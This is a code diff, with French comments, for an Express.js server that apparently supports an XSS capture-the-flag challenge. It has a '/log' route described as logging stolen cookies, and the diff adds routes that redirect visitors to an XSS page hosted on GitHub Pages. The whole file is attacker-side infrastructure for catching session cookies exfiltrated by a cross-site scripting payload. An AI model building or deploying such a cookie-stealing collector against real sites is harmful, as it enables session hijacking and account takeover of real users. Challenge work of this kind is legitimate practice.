@@ -1,5 +1,4 @@
 const express = require('express');
-const path = require('path');
 const app = express();
 
 // Route pour logger les cookies volés
@@ -8,13 +7,17 @@ app.get('/log', (req, res) => {
   res.send('Cookie reçu, merci !');
 });
 
-// Sert tous les fichiers statiques du dossier où est ton xss.html
-app.use(express.static(path.join(__dirname))); // ici, __dirname = dossier où est ton serveur
+// Redirection vers ta page XSS hébergée sur GitHub Pages
+app.get('/', (req, res) => {
+  res.redirect('https://aketo.github.io/xss-test/xss.html'); // ← adapte à ton vrai repo si différent
+});
 
-// Ou tu peux être plus précis si ton xss.html est dans un sous-dossier :
-// app.use(express.static(path.join(__dirname, 'xss-server')));
+// Route alternative au cas où tu veux soumettre cette URL au challenge
+app.get('/xss', (req, res) => {
+  res.redirect('https://aketo.github.io/xss-test/xss.html'); // ← idem
+});
 
-
+// Lancement du serveur
 app.listen(5000, '0.0.0.0', () => {
   console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
 });
